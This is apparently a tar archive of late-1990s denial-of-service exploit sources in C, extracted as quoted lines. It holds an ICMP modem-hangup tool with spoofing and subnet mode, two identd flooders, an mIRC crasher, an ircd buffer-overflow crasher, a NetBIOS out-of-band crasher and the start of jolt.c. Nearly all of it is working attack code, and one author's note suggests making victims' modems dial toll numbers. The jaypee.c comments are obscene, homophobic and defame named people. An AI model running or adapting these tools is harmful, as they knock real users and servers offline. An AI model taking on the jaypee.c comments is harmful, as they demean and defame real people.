            "\tmemset(packet,0,pktsize);",
            "\tip->version = 4;",
            "\tip->ihl = 5;",
            "\tip->tos = 0;",
            "\tip->tot_len = htons(pktsize);",
            "\tip->id = htons(getpid());",
            "\tip->frag_off = 0;",
            "\tip->ttl = 255;",
            "\tip->protocol = IPPROTO_ICMP;",
            "\tip->check = 0;",
            "\tip->saddr = src;",
            "\tip->daddr = dst;",
            "\ticmp->type = ICMP_ECHO;",
            "\ticmp->code = 0;",
            "\ticmp->checksum = 0;",
            "\tstrcpy(data,\"+++ATH0\\r\");",
            "\tif(mcommand) {",
            "\t\tstrcat(data,thestring);",
            "\t\tstrcat(data,\"\\r\");",
            "\ticmp->checksum = in_cksum((u_short *)icmp,sizeof(struct icmphdr)+datasize);",
            "\tif(!subnetmode) {",
            "\t\tif( (sendto(sockfd,packet,pktsize,0,(struct sockaddr *)&sin,sizeof(struct sockaddr)) )==-1) {",
            "\t\t\tprintf(\"sendto failed\\n\");",
            "\t\t} else {",
            "\t\t\tprintf(\".\");",
            "\t} else {",
            "\t\tfor(tmp=0;tmp<256;tmp++) {",
            "\t\t\tip->daddr += 1*256*256*256;",
            "\t\t\tip->check = 0;",
            "\t\t\tif( (sendto(sockfd,packet,pktsize,0,(struct sockaddr *)&sin,sizeof(struct sockaddr)) )==-1) {",
            "\t\t\t\tprintf(\"sendto failed\\n\");",
            "\t\t\t\tbreak;",
            "\t\t\t}",
            "\t\t\tprintf(\".\");",
            "\t\t\tfflush(stdout);",
            "\tprintf(\"\\ndone\\n\");",
            "\treturn 0;",
            "unsigned long doresolve(char *stuff) {",
            "\tstruct hostent *heh;",
            "\tunsigned long hi;",
            "\thi = inet_addr(stuff);",
            "\tif(hi==-1) {",
            "\t\theh = gethostbyname(stuff);",
            "\t\tif(!heh) {",
            "\t\t\tfprintf(stderr,\"I can't resolve \\\"%s\\\"\\n\",stuff);",
            "\t\t\texit(1);",
            "\t\treturn (unsigned long)heh->h_addr;",
            "\treturn hi;",
            " * in_cksum --",
            " *\tChecksum routine for Internet Protocol family headers (C Version)",
            "static int",
            "in_cksum(u_short *addr, int len)",
            "\tregister int nleft = len;",
            "\tregister u_short *w = addr;",
            "\tregister int sum = 0;",
            "\tu_short answer = 0;",
            "\t * Our algorithm is simple, using a 32 bit accumulator (sum), we add",
            "\t * sequential 16 bit words to it, and at the end, fold back all the",
            "\t * carry bits from the top 16 bits into the lower 16 bits.",
            "\t */",
            "\twhile (nleft > 1)  {",
            "\t\tsum += *w++;",
            "\t\tnleft -= 2;",
            "\t/* mop up an odd byte, if necessary */",
            "\tif (nleft == 1) {",
            "\t\t*(u_char *)(&answer) = *(u_char *)w ;",
            "\t\tsum += answer;",
            "\t/* add back carry outs from top 16 bits to low 16 bits */",
            "\tsum = (sum >> 16) + (sum & 0xffff);\t/* add hi 16 to low 16 */",
            "\tsum += (sum >> 16);\t\t\t/* add carry */",
            "\tanswer = ~sum;\t\t\t\t/* truncate to 16 bits */",
            "\treturn(answer);",
            "void docmdline(int argc,char **argv) {",
            "\tint optch,showhelp=0,stuff=0;",
            "\tstatic char optstring[] = \"S:shm:d:\";",
            "\twhile( (optch = getopt(argc,argv,optstring))!= -1)",
            "\t\tswitch(optch) {",
            "\t\t\tcase 'S':",
            "\t\t\t\tif(strlen(optarg)>BUFSIZE-1) {",
            "\t\t\t\t\tfprintf(stderr,\"source can only be %d characters\\n\",BUFSIZE);",
            "\t\t\t\t\texit(1);",
            "\t\t\t\t}",
            "\t\t\t\tstrcpy(source,optarg);",
            "\t\t\tbreak;",
            "\t\t\tcase 's':",
            "\t\t\t\tsubnetmode=1;",
            "\t\t\tbreak;",
            "\t\t\tcase 'm':",
            "\t\t\t\tmcommand=1;",
            "\t\t\t\tif(strlen(optarg)>BUFSIZE-1) {",
            "\t\t\t\t\tfprintf(stderr,\"command can only be %d characters\\n\",BUFSIZE);",
            "\t\t\t\t\texit(1);",
            "\t\t\t\t}",
            "\t\t\t\tstrcpy(thestring,optarg);",
            "\t\t\t\tdatasize += strlen(thestring)+2;",
            "\t\t\tbreak;",
            "\t\t\tcase 'd':\t",
            "\t\t\t\tdelay = strtol(optarg,(char **)NULL,10);",
            "\t\t\t\tif(errno==ERANGE) {",
            "\t\t\t\t\tfprintf(stderr,\"bogus delay value (using default)\\n\");",
            "\t\t\t\t\tdelay = DEFDELAY;",
            "\t\t\t\t}",
            "\t\t\tbreak;",
            "\t\t\t\t",
            "\t\t\tcase 'h':",
            "\t\t\t\tshowhelp=1;",
            "\t\t\tbreak;",
            "\t\t\tdefault:",
            "\tfor (; optind < argc; ++optind)",
            "\t\tstuff=1;",
            "\t\tif(strlen(argv[optind])>BUFSIZE-3) { // for \".0\"",
            "\t\t\tfprintf(stderr,\"source can only be %d characters\\n\",BUFSIZE);",
            "\t\t\texit(1);",
            "\t\tstrcpy(target,argv[optind]);",
            "\t\tif(subnetmode)",
            "\t\t\tstrcat(target,\".0\");",
            "\tif(!stuff) showhelp=1;",
            "\tif(showhelp) {",
            "\t\tprintf(\"usage: gin [-S <source host>] [-s] [-m <command] [-d <delay>] <dest>\\n\");",
            "   \t\tprintf(\"\\t -S specfies a source host (defaults to random)\\n\");",
            "    \t\tprintf(\"\\t -s turns on subnet mode, dest is interpreted as a class c (1.2.3)\\n\");",
            "\t\tprintf(\"\\t -m adds another modem command after the hang up\\n\");",
            "\t\tprintf(\"\\t -d delay in ms between sent packets\\n\");",
            "\t\texit(0);",
            "datapool/src/gewse5.c",
            "0100644",
            "0000000",
            "0000000",
            "00000006137",
            "07051164074",
            "013525",
            "ustar  ",
            "root",
            "root",
            "/* gewse.c by napster..",
            " * my first attempt at anything so it sucks..",
            " * werd to prym, vcx, and djesus for help",
            " * werd to aut0psy the C genius for rewriting lots of it ",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#define MAX                      512",
            "/* Prototypes */",
            "unsigned int resolve(char *host);",
            "void usage(char *progname);",
            "void reseed(void);",
            "void usage(char *progname)",
            "        printf(\"gewse.c by napster...\\n\");",
            "        printf(\"usage: %s <host> <# of connex>\\n\",progname);",
            "        exit(-1);",
            "main(int argc, char *argv[])",
            " /* Mainly by napster - a lot reorganized/rewritten by Aut0psy... */",
            "        ",
            "        unsigned int resolved_host;",
            "        struct sockaddr_in sin[MAX];",
            "        int numkill, x, y, port, sdesc[MAX];",
            "        char *getident = malloc(128);",
            "        if (argc < 3) usage(argv[0]);",
            "        reseed();",
            "        resolved_host = resolve(argv[1]);    ",
            "        numkill = atoi(argv[2]);",
            "        printf(\"Flooding %s identd %d times.\\n\", argv[1], numkill);",
            "        printf(\"Killing\");",
            "        fflush(stdout);",
            "        y = 0;",
            "        fork();",
            "        fork();",
            "\tfork();\t",
            "        for (x=0;x<numkill;x++) {",
            "                y++;",
            "                if (x == MAX) x = 0;",
            "                /* Create Socket */",
            "                sdesc[x] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);",
            "                if (sdesc[x] < 0) ",
            "                {",
            "                        perror(\"socket\");",
            "                        exit(-1);",
            "                }",
            "                /* Fill in Socket Endpoint */",
            "                sin[x].sin_family = AF_INET;",
            "                sin[x].sin_port = htons(113);",
            "                sin[x].sin_addr.s_addr = resolved_host;",
            "                /* Make a random port identd string. */",
            "                port = 1+(int) (10000.0*rand()/(RAND_MAX + 1.0));",
            "                sprintf(getident, \"%d, 6667 : USERID : UNIX : die\\n\", port);",
            "                /* Connect to dest host. */",
            "                if (connect(sdesc[x], (struct sockaddr *)&sin[x], sizeof(sin[x])) < 0)",
            "                {",
            "                        perror(\"connect\");",
            "                        exit(-1);",
            "                }",
            "                printf(\".\");",
            "                fflush(stdout);",
            "                /* Send random port identd string over the socket. */",
            "                (void) write(sdesc[x], getident, strlen(getident));",
            "          ",
            "                if (y >= numkill) break;",
            "        }",
            "        printf(\"\\n\");",
            "unsigned int resolve(char *host) ",
            "  /* resolve routine written by Aut0psy. */",
            "        struct hostent *he;",
            "        struct sockaddr_in tmp;",
            "        /* Lookup host. */",
            "        he = gethostbyname(host);",
            "        if (he) ",
            "        {",
            "                /* Copy host into a temporary endpoint. */",
            "                memcpy((caddr_t)&tmp.sin_addr.s_addr, he->h_addr, he->h_length);",
            "        } else {",
            "                perror(\"resolving\");",
            "                exit(-1);",
            "        }",
            "        /* Return address in network byte order. */  ",
            "        return(tmp.sin_addr.s_addr);",
            "void reseed(void) ",
            "        /* Seed random number database based on time of day... */",
            "        srand(time(NULL));",
            "datapool/src/gewse.c",
            "0100644",
            "0000000",
            "0000000",
            "00000002757",
            "07051164074",
            "013444",
            "ustar  ",
            "root",
            "root",
            "/* gewse.c by napster..",
            " * my first attempt at anything so it sucks..",
            " * werd to Aut0psy, prym, vcx, and djesus fer help...",
            " * thankz to majikal fer the cool name. =)",
            " * And oh yeah, NONE of this is ripped....",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#define GETIDENT \"1027, 6667 : USERID : UNIX : die\"",
            "int sockdesc;",
            "int portkill;",
            "int numkill;",
            "int x;",
            "void usage(char *progname)",
            "  printf(\"gewse.c by napster...\\n\");",
            "  printf(\"usage: %s <host> <# of connex>\\n\",progname);",
            "  exit(69);",
            "main(int argc, char *argv[])",
            "    ",
            " struct sockaddr_in sin;",
            " struct hostent *he;",
            " if (argc<3) usage(argv[0]);",
            " sin.sin_port = htons(113);",
            " sin.sin_family = AF_INET;",
            " he = gethostbyname(argv[1]);",
            " if (he) {",
            "   sin.sin_family = AF_INET;",
            "   sin.sin_port = htons(113);",
            "   memcpy((caddr_t)&sin.sin_addr.s_addr, he->h_addr, he->h_length);",
            " } else {",
            "   perror(\"resolving\");",
            " numkill  = atoi(argv[2]);",
            " printf(\"Flooding %s [%s] identd %d times.\\n\", argv[1], inet_ntoa(sin.sin_addr.s_addr), numkill);",
            " printf(\"Killing\");",
            " fflush(stdout);",
            " for (x=1;x<=numkill;x++) {",
            " sockdesc = socket(AF_INET, SOCK_STREAM, 0);",
            " if (sockdesc < 0) {",
            "  perror(\"socket\");",
            "  exit(69);",
            "  if (connect(sockdesc, (struct sockaddr *)&sin, sizeof(sin)) < 0) {",
            "   perror(\"connect\");",
            "   exit(69);",
            "  printf(\" .\");",
            "  fflush(stdout);",
            "  (void) write(sockdesc, GETIDENT, strlen(GETIDENT));",
            " printf(\"\\n\");",
            "datapool/src/gin.c",
            "0100644",
            "0000000",
            "0000000",
            "00000021546",
            "07070750756",
            "013115",
            "ustar  ",
            "root",
            "root",
            "[ http://www.rootshell.com/ ]",
            "Date: Sun, 6 Jun 1999 22:05:49 -0700 (PDT)",
            "To: submission@rootshell.com",
            "Subject: 'new' DoS",
            "Hey kids, amputee here...",
            "Pointed out to me recently was a 'new' DoS if you can call it that..I'm",
            "sure lots of people have thought of doing this, but I haven't seen or",
            "heard of anythingl ike it yet. So here goes, as usual a code to test the",
            "exploit is attached below, now for a long boring technical explanation",
            "(script kiddiez, skip to the code now)",
            "[ explanation ]",
            " The way the exploit works is it hides escape/control sequences in a ICMP",
            "echo_request packet (it contains the string +++ATH0) the +++ sends the",
            "modem into escape mode (and if the guard time on the modem is set",
            "ridiculously low) it will go into command mode and you can issue it an",
            "ATH0 to hang up. It works on the reply, because it receives the",
            "echo_request packet, then duplicates the packet with a new timestamp and",
            "checksum, dest/source hosts and returns it to the sender, when it returns",
            "it the string is sent to the modem, and thus hanging it up. There are a",
            "few conditions that must be met for it to work (if you dont want to be",
            "vulnerable to this, fix these!)",
            "1) target computer must not filter ICMP echo_request and must know how to",
            "reply to one if it gets one",
            "2) target computer must be using a modem (you can't hangup DS3s, although",
            "i suppose you could hangup telco return connections..if you can find one)",
            "3) target computer must have a vulnerable modem (i.e. guard time is set",
            "ridiculously low)",
            "4) you have to be able to send spoofed packets (or..if you can't i guess",
            "you can use your own address, but then the target knows where it came",
            "from)",
            "In my experimenting, I have also devised various fun ways to use this",
            "program other than just nuking your buddy off IRC. In theory..it is",
            "possible to modify the program to do fun stuff like make the target call",
            "some number after it hangs up (i.e. +++ATH0,,,DT5551212) should make the",
            "modem hangup, pause for 6 seconds then call 5551212..this is fun for",
            "obvious reasons. Then the next variation I came up with is a smurf like",
            "implementation in which you could make a script to DoS a class C subnet,",
            "with the number of your least favorite company, since most company's have",
            "800 numbers, not only does this cause chaos to the phone bank, but also",
            "costs ~$.30 per call...but i don't condone any of those ideas of course,",
            "this is just for experimental/educational purposes only, if you fix your",
            "modems, none of this is possible, so get off your ass and fix it.",
            "script kiddiez: here is your code...",
            "--- CUT HERE --- CUT HERE --- CUT HERE --- CUT HERE --- CUT HERE ---",
            " * gin.c [ fuck the soda nukers, im no kiddie ]",
            " * [ http://www.rootshell.com/ ]",
            " * [ sarcastic program description here ]",
            " *   pff, hey kiddiez! this program sends mad packets to some foo from",
            " *   every broadcast address on earth, mad leet yo...",
            " *   (you really wanna know what it does? LEARN TO CODE! and stop being a ",
            " *   gayass fuckin script kiddie)",
            " * Author: amputee (amputee@fack.net)",
            " * Compiled on:",
            " *      Linux 2.2.9 i586 (GNU/Debian 2.2 development version)",
            " *      egcs-2.91.66",
            " * [ time for greets, and fuck yous ]",
            " * [ Greets (in no logical order) ]",
            " *  scummy, fobia (come back foo), ignitor, stalin, bigs, rotafer, statix ",
            " *  silencers, blackang|, porp, the rest of #shutdown, soldier, klepto,",
            " *  drastic, the other #havok OGs and #eof, governor, cry0mance, gixerboy, ",
            " *  protocol-, broknbonz, abalution,  and anyone else i forgot that isn't ",
            " *  in my fuck you list...",
            " * [ Fuck yous ]",
            " *  spawn66x1 <--hahah, nucleoid (aka dynamo, emulate, microbe, immune, ",
            " *  logistic ) you annoy me you stupid fuck, all authorities at PVPHS",
            " *  (my old high school) i wish cancer upon you. madcrew, you are gay",
            " *  and, anyone else who isnt in my greets list =]",
            " * [ disclaimer ]",
            " *  i really dont see how i could get in trouble for this stupid program",
            " *  its really not that great, but the legal system is gay these days,",
            " *  so...this program is for educational purposes only, and the author",
            " *  holds no liability for the actions of the people that use it, that ",
            " *  includes dwarfs, cyclopses, albinos, and anyone else who may happen",
            " *  to use my program. dont modify or rip on this shit, suck me",
            " *      -- amp",
            "#include <stdio.h>",
            "#include <signal.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <ctype.h>",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <arpa/inet.h>",
            "#include <netdb.h>",
            "#include <sys/time.h>",
            "#define VERSION \"1.2-05.05\" //fixed old compiler compatibility problems",
            "#define FRIEND  \"Kaladis\"",
            "void usage( char *name );",
            "void banner( void );",
            "char *get_progname( char *fullname );",
            "void done( int foo );",
            "void gin( int port, struct sockaddr_in sin, struct sockaddr_in din );",
            "unsigned short in_chksum( u_short *ipbuf, int iplen );",
            "int main( int argc, char **argv )",
            "    struct hostent *sourceinfo, *destinfo;",
            "    struct sockaddr_in sin, din;",
            "    int sockfd, numpackets, i;",
            "    char *target, *source;",
            "    banner();",
            "    ( argc < 4 ) ? usage( get_progname( argv[0] ) ) : ( void )NULL;",
            "    source = argv[1];",
            "    target = argv[2];",
            "    numpackets = ( atoi( argv[3] ) );",
            "    signal( SIGINT, done );",
            "    if( ( sourceinfo = gethostbyname( source ) ) == NULL )",
            "    {",
            "        printf( \"cannot resolve source host!\\n\" );",
            "        exit( -1 );",
            "    }",
            "    memcpy( ( caddr_t )&sin.sin_addr, sourceinfo->h_addr,",
            "        sourceinfo->h_length );",
            "    sin.sin_family = AF_INET;",
            "    if( ( destinfo = gethostbyname( target ) ) == NULL )",
            "    {",
            "        printf( \"cannot resolve destination host!\\n\" );",
            "        exit( -1 );",
            "    }",
            "    memcpy( ( caddr_t )&din.sin_addr, destinfo->h_addr,",
            "        destinfo->h_length );",
            "    din.sin_family = AF_INET;",
            "    if( ( sockfd = socket( AF_INET, SOCK_RAW, IPPROTO_RAW ) ) < 0 )",
            "    {",
            "        printf( \"Cannot get raw socket, you must be root!\\n\" );",
            "        exit( -1 );",
            "    }",
            "    printf( \"Source Host\\t\\t: %s\\n\", inet_ntoa( sin.sin_addr ) );",
            "    printf( \"Target Host\\t\\t: %s\\n\", inet_ntoa( din.sin_addr ) );",
            "    printf( \"Number\\t\\t\\t: %d\\n\", numpackets );",
            "    printf( \"Have some gin!\\n\" );",
            "    for( i = 0; i < numpackets; i++ )",
            "        gin( sockfd, sin, din );",
            "    printf( \"\\n\\nsent %d packet%c...done\\n\", numpackets, ( numpackets > 1",
            "        ? 's' : ( char )NULL );",
            "    return 0;",
            "void usage( char *name )",
            "    printf( \"usage: %s <source host> <dest host> <num packets>\\n[ http://www.rootshell.com/ ] \\n\\n\", name",
            "    exit( 0 );",
            "void banner( void )",
            "        printf( \"\\ngin [ v%s ] /\\\\ by amputee\\n\", VERSION );",
            "        printf( \"compiled for: %s\\n\\n\", FRIEND );",
            "char *get_progname( char *fullname )",
            "    char *retval = strrchr( fullname, '/' );",
            "    return retval ? ++retval : fullname;",
            "void done( int foo )",
            "    puts( \"Exiting...\\n\" );",
            "    exit( 1 );",
            "void gin( int port, struct sockaddr_in sin, struct sockaddr_in din )",
            "    char *ginstring = \"+++ATH0\\r+++ATH0\\r+++ATH0\\r+++ATH0\\r\";",
            "    char *packet;",
            "    int total;",
            "    struct iphdr *ip;",
            "    struct icmphdr *icmp;",
            "    size_t msglen = sizeof( ginstring ), iphlen = sizeof( struct iphdr );",
            "    size_t icplen = sizeof( struct icmphdr ), timlen = sizeof( struct",
            "timeval );",
            "    int len = strlen( ginstring );",
            "    packet = ( char * )malloc( iphlen + icplen + len );",
            "    ip = ( struct iphdr * )packet;",
            "    icmp = ( struct icmphdr * )( packet + iphlen );",
            "    ( void )gettimeofday( ( struct timeval * )&packet[( icplen + iphlen",
            "        ( struct timezone * )NULL );",
            "    memcpy( ( packet + iphlen + icplen + timlen ), ginstring, ( len - 4 )",
            "    ip->tot_len = htons( iphlen + icplen + ( len - 4 ) + timlen );",
            "    ip->version = 4;",
            "    ip->ihl = 5;",
            "    ip->tos = 0;",
            "    ip->ttl = 255;",
            "    ip->protocol = IPPROTO_ICMP;",
            "    ip->saddr = sin.sin_addr.s_addr;",
            "    ip->daddr = din.sin_addr.s_addr;",
            "    ip->check = in_chksum( ( u_short * )ip, iphlen );",
            "    icmp->type = ICMP_ECHO;",
            "    icmp->code = 0;",
            "    icmp->checksum = in_chksum( ( u_short * )icmp, ( icplen + ( len - 4 )",
            ") );",
            "    total = ( iphlen + icplen + timlen + len + 16 );",
            "    sendto( port, packet, total, 0,",
            "        ( struct sockaddr * )&din, sizeof( struct sockaddr ) );",
            "    free( packet );",
            "// stolen from smurf ",
            "unsigned short in_chksum( u_short *ipbuf, int iplen )",
            "    register int nleft = iplen;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    while( nleft > 1 )",
            "    {",
            "        sum += *ipbuf++;",
            "        nleft -= 2;",
            "    }",
            "    if( nleft == 1 )",
            "    {",
            "        *( u_char * )( &answer ) = *( u_char * )ipbuf;",
            "        sum += answer;",
            "    }",
            "    sum = ( sum >> 16 ) + ( sum + 0xffff );",
            "    sum += ( sum >> 16 );",
            "    answer = ~sum;",
            "    return( answer );",
            " --- CUT HERE --- CUT HERE --- CUT HERE --- CUT HERE --- CUT HERE ---",
            "Also note: some machines seg fault when they run this, and setting the",
            "environment variable MALLOC_CHECK_ to 1 seems to solve this. And..this",
            "code will probably come out all offset and break when you try to compile",
            "it...so just fix it, it compiles fine (i use g++ -O3 -o gin gin.c).",
            "datapool/src/hanson.c",
            "0100644",
            "0000000",
            "0000000",
            "00000005404",
            "07100064434",
            "013602",
            "ustar  ",
            "root",
            "root",
            "/* http://www.rootshell.com/ - 12/23/97 */",
            "/*  hanson.c - by myn with help from h2o and watcher *thanks*",
            "    This lil program exploits mIRC's bound sockets, making the client crash",
            "    mIRC can handle a mass influx of data but cannot handle strings of data",
            "    that are parsed internally through mIRC. This program forces mIRC to",
            "    parse incoming data and identify it, the result from the parse",
            "    is larger then mIRC's buffer string size, thus making the",
            "    client crash :).  This will create 5 connections to the bound port and",
            "    then send the string.",
            "    Its like sending double \"int\" when you only had 1 bit to work with!",
            "    hanson.c is dedicated to all the lil 13 to 16 year old geeks (abyss)",
            "    that are in love with those cute boys..",
            "          myn@efnet",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <unistd.h>",
            "int x, s, i, p, dport;",
            "/* SET STRING HERE */",
            "char *str =",
            "\"9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
            "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999\";",
            "struct sockaddr_in addr, spoofedaddr;",
            "struct hostent *host;",
            "int open_sock(int sock, char *server, int port) {",
            "     struct sockaddr_in blah;",
            "     struct hostent *he;",
            "     bzero((char *)&blah,sizeof(blah));",
            "     blah.sin_family=AF_INET;",
            "     blah.sin_addr.s_addr=inet_addr(server);",
            "     blah.sin_port=htons(port);",
            "    if ((he = gethostbyname(server)) != NULL) {",
            "        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);",
            "    }",
            "    else {",
            "         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {",
            "           perror(\"gethostbyname()\");",
            "           return(-3);",
            "         }",
            "    }",
            "        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {",
            "             perror(\"connect()\");",
            "             close(sock);",
            "             return(-4);",
            "        }",
            "        printf(\"     Connected to [%s:%d].\\n\",server,port);",
            "        return;",
            "void main(int argc, char *argv[]) {",
            "     int t;",
            "     if (argc != 3) {",
            "       printf(\"hanson.c - myn@efnet\\n\\n\");",
            "       printf(\"This lil program exploits mIRC's bound sockets, making the client crash\\n\\n\");",
            "       printf(\"Usage: %s <target> <port>\\n\",argv[0]);",
            "       exit(0);",
            "     }",
            "     printf(\"hanson.c - myn@efnet\\n\\n\");",
            "     for (t=0; t<5; t++)",
            "     {",
            "     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {",
            "        perror(\"socket()\");",
            "        exit(-1);",
            "     }",
            "     p = atoi(argv[2]);",
            "     open_sock(s,argv[1],p);",
            "     printf(\"     Sending string 1ooo times to %s port %i... \\n\", argv[1], p);",
            "     for (i=0; i<1000; i++) {",
            "       send(s,str,strlen(str),0x0);",
            "     }",
            "     printf(\"mmmmb0p.\\n\");",
            "     }",
            "     close(s);",
            "datapool/src/ircd_kill.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007327",
            "07100655353",
            "014264",
            "ustar  ",
            "root",
            "root",
            "/* ircdcrash.c by fx of nnh (aaron@ug.cs.dal.ca)",
            " * Shouts out to: Punisher, TCroc, NC, gg, A-Flat, DBN3 crew.",
            " * Thanks to Andy Church for addressing this problem on Bugtraq.",
            " * There is a buffer overflow condition in the ircd/s_serv.c file of the",
            " * ircd2.8.21 distribution and most likely exists in other versions. It is",
            " * possible to exploit this by sending a very long string as the third",
            " * parameter (<info>) to the SERVER command. Nothing particularly fancy here,",
            " * this program will just attempt to segfault the daemon. Here is the syntax",
            " * of the SERVER command:",
            " * SERVER <servername> <hopcount> <info>",
            " * Here is the offending code, out of the m_server function:",
            " *       if (parc > 3 && atoi(parv[2]))",
            " *          {",
            " *              hop = atoi(parv[2]);",
            " *              (void)strncpy(info, parv[3], REALLEN);",
            " *          }",
            " *       else if (parc > 2)",
            " *          {",
            " *              (void)strncpy(info, parv[2], REALLEN);",
            " *              if (parc > 3)",
            " *                  {",
            " *                              i = strlen(info);",
            " *                              (void)strncat(info, \" \", REALLEN - i - 1);",
            " *                              (void)strncat(info, parv[3], REALLEN - i - 2);",
            " *                  }",
            " * REALLEN is defined to be 50 in include/struct.h. Notice that in order for",
            " * the second (and therefore third) if() statement to be executed,",
            " * atoi(parv[2]) must NOT return a value. This means we must not send",
            " * numeric characters as the second parameter (<hopcount>), but we must send",
            " * 50 characters to ensure REALLEN - i - 2 will be less then 0.",
            " * See Andy Church's post on Bugtraq for a patch.",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <strings.h>",
            "#include <unistd.h>",
            "#include <arpa/inet.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/uio.h>",
            "#include <sys/time.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <sys/wait.h>",
            "int main(int argc, char *argv[])",
            "        char *str;",
            "        int i, port = 6667, soc;",
            "        struct sockaddr_in their_addr;",
            "        /* open a socket for connecting */",
            "        if ( (soc = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {",
            "                perror(\"socket\");",
            "                exit(0);",
            "        }",
            "        if ( argc < 2 ) {",
            "                printf(\"Usage: %s <ip_of_irc_server> <port>\\n\", argv[0]);",
            "                exit(1);",
            "        }",
            "        else",
            "                if ( argc > 2 )",
            "                        port = atoi(argv[2]);",
            "        /* fill-in target address struct */",
            "        their_addr.sin_family = AF_INET;",
            "        their_addr.sin_port = htons(port);",
            "        their_addr.sin_addr.s_addr = inet_addr(argv[1]);",
            "        bzero(&(their_addr.sin_zero),8);",
            "        /* copy data into our string */",
            "        str = (char *)malloc(4096);",
            "        strcpy(str, \"SERVER warez.blackdown.org aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa :[\");",
            "        printf(\"\\nCreating string to send... Wait a sec...\\n\");",
            "        for (i = 0; i < 4000; i++)",
            "                strcat(str, \"o\");",
            "        strcat(str, \"]\\n\");",
            "        /* connect to target server */",
            "        if ( connect(soc, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) < 0 )        {",
            "                perror(\"connect\");",
            "                exit(1);",
            "        }",
            "        else    {",
            "                /* server might have something to say... wait... */",
            "                printf(\"Wait... Server might be talking to us...\\n\");",
            "                sleep(4);",
            "                /* send string */",
            "                printf(\"Sending crash string...\");",
            "                if ( send(soc, str, strlen(str), 0) < 0 )       {",
            "                        perror(\"send\");",
            "                        exit(1);",
            "                }",
            "                /* finished */",
            "                printf(\"Done!\\n\\n\");",
            "                close(soc);",
            "                return(1);",
            "        }",
            "datapool/src/jaypee.c",
            "0100644",
            "0000000",
            "0000000",
            "00000004625",
            "07100655361",
            "013602",
            "ustar  ",
            "root",
            "root",
            "/* jaypee.c for anal raping the shit for the best news on the net  */",
            "/* Tested on Win 3.x and Mac - also took out my server for 9 days! ouchie",
            "   my pee pee- Greetz Miliw0rm for allowing me to give massive head to the",
            "                        whole crew for news!",
            "This is copyrighted by all of anti0nline any usage , distrbuting or",
            "jacking off without me peeping in the window will result in a law suit */",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <unistd.h>",
            "#define dport 139  /* Hey lovers looking for a good fat gay? jp@antionline.com */",
            "int x, s;",
            "char *str = \"Jp\";  /* Analonline comming soon just send nude gay pics  */",
            "struct sockaddr_in addr, spoofedaddr;",
            "struct hostent *host;",
            "int open_sock(int sock, char *server, int port) {",
            "     struct sockaddr_in blah;",
            "     struct hostent *he;",
            "     bzero((char *)&blah,sizeof(blah));",
            "     blah.sin_family=AF_INET;",
            "     blah.sin_addr.s_addr=inet_addr(server);",
            "     blah.sin_port=htons(port);",
            "    if ((he = gethostbyname(server)) != NULL) {",
            "        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);",
            "    }",
            "    else {",
            "         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {",
            "           perror(\"gethostbyname()\");",
            "           return(-3);",
            "         }",
            "    }",
            "        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {",
            "             perror(\"connect()\");",
            "             close(sock);",
            "             return(-4);",
            "        }",
            "        printf(\"JaY peE is SendinG MaSsivE AnAl Rape  to",
            "[%s:%d].\\n\",server,port);",
            "        return;",
            "void main(int argc, char *argv[]) {",
            "     if (argc != 2) {",
            "printf(\"Usage: ./jaypee [ anus to penetrate]\\n\",argv[0]);",
            "printf(\"Antionline is a (c) of Hegirls.com the best fetish on the net",
            "\\n\",argv[0]);",
            "printf(\"Did i mention i was a model under the name pee jay? lick my balls",
            "\\n\",argv[0]);",
            "printf(\"Hey lovers catch me on Undernet #analfetish",
            "            -email jp@antionline.com\\n\",argv[0]);",
            "       exit(0);",
            "     }",
            "     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {",
            "        perror(\"socket()\");",
            "        exit(-1);",
            "     }",
            "     open_sock(s,argv[1],dport);",
            "     printf(\"Analing jay pee target crash... \");",
            "       send(s,str,strlen(str),MSG_OOB);",
            "       ",
            "     printf(\"oh yes i feel gay susesfuly raped by -jp!\\n\");",
            "     close(s);",
            "/*The fix to the jay pee bug- just send nude gay pics and hairy female",
            " portrits of your mothers - Tanxs! Jay Pee - John Vranalvich */",
            "datapool/src/jolt.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007374",
            "07100657177",
            "013310",
            "ustar  ",
            "root",
            "root",
            "/* Jolt 1.0 (c) 1997 by Jeff w. Roberson",
            " * Please, if you use my code give me credit.  Also, if i was the first to",
            " * find this glitch, please give me credit.  Thats all i ask.",
